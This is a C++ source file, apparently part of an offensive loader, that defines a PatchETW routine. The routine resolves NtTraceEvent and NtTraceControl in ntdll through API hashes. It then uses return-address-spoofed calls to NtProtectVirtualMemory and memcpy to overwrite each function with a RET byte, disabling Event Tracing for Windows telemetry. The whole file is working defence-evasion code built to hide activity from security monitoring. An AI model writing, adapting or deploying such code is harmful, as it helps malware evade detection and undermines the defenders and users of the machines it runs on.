#pragma once
#include <windows.h>
#include <iostream>
#include "functions.h"
#include "retaddrspoof.h"
#include "types.h"
#include "resolvers.h"
#include "defs.h"

extern PVOID Gdgt;


int ValidateMemory(const void * ptr1, const void * ptr2, size_t num){

	int result = reinterpret_cast<int>(RetSpoofCall(memcmp, 3, Gdgt, ptr1, ptr2, num));

	return result;
}


void PatchETW() {


	HMODULE hNT = GetLoadedDllHandleH(776560387);

	unsigned char* pNtTraceEvent = reinterpret_cast<unsigned char*>(GetFunctionAddressH(hNT, 2226474731));
	unsigned char* pNtTraceControl = reinterpret_cast<unsigned char*>(GetFunctionAddressH(hNT, 2097340520));


	unsigned long dwOldProtectionEvent = 0;
	unsigned long dwOldProtectionControl = 0;
	unsigned long long ntsize = 1;

	unsigned char* ControlProtectionOffset = pNtTraceControl + 3;
	unsigned char* EventProtectionOffset = pNtTraceEvent + 3;
	unsigned char sourceBuffer = 0xC3;


	NTSTATUS Controlstatus = reinterpret_cast<NTSTATUS>(RetSpoofCall((void*)NtProtectVirtualMemory, 5, Gdgt, SELF_HANDLE, &ControlProtectionOffset, &ntsize, PAGE_EXECUTE_READWRITE, &dwOldProtectionControl));
	NTAPI_VALIDATE_RETURN2VOID(NtProtectControl, Controlstatus);


	NTSTATUS Eventstatus = reinterpret_cast<NTSTATUS>(RetSpoofCall((void*)NtProtectVirtualMemory, 5, Gdgt, SELF_HANDLE, &EventProtectionOffset, &ntsize, PAGE_EXECUTE_READWRITE, &dwOldProtectionEvent));
	NTAPI_VALIDATE_RETURN2VOID(NtProtectEvent, Eventstatus);


	RetSpoofCall(memcpy, 3, Gdgt , ControlProtectionOffset, &sourceBuffer, sizeof sourceBuffer );
	
	if (ValidateMemory(ControlProtectionOffset, &sourceBuffer, sizeof(sourceBuffer)) != 0) {
        fprintf(stderr, "Error: failed to patch etw function NtTraceControl: Data mismatch after copy.\n");
        return;
    }


	RetSpoofCall(memcpy, 3, Gdgt , EventProtectionOffset, &sourceBuffer, sizeof sourceBuffer );

	if (ValidateMemory(EventProtectionOffset, &sourceBuffer, sizeof(sourceBuffer)) != 0) {
        fprintf(stderr, "Error: failed to patch etw function NtTraceEvent: Data mismatch after copy.\n");
        return; 
    }

	Controlstatus = reinterpret_cast<NTSTATUS>(RetSpoofCall((void*)NtProtectVirtualMemory, 5, Gdgt, SELF_HANDLE, &ControlProtectionOffset, &ntsize, dwOldProtectionControl, &dwOldProtectionControl));
	NTAPI_VALIDATE_RETURN2VOID(NtProtectControl2, Controlstatus);


	Eventstatus = reinterpret_cast<NTSTATUS>(RetSpoofCall((void*)NtProtectVirtualMemory, 5, Gdgt, SELF_HANDLE, &EventProtectionOffset, &ntsize, dwOldProtectionEvent, &dwOldProtectionEvent));
	NTAPI_VALIDATE_RETURN2VOID(NtProtectEvent2, Eventstatus);

#ifdef _DEBUG_PRINT
	std::cout << "[DEBUG] Patched ETW !\n";
#endif
	return;
}